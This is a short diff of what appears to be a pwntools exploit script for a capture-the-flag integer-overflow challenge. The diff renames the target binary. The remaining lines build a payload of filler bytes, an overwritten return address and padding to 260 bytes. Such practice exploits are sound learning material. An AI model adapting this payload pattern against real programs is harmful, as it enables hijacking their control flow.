@@ -1,5 +1,5 @@
 from pwn import *
-p=process("./int_overflow")
+p=process("./int1")
 overflowMax=260
 payload=0x18*b'a'+p32(0x0804868b)
 payload+=(overflowMax-len(payload))*b'a'
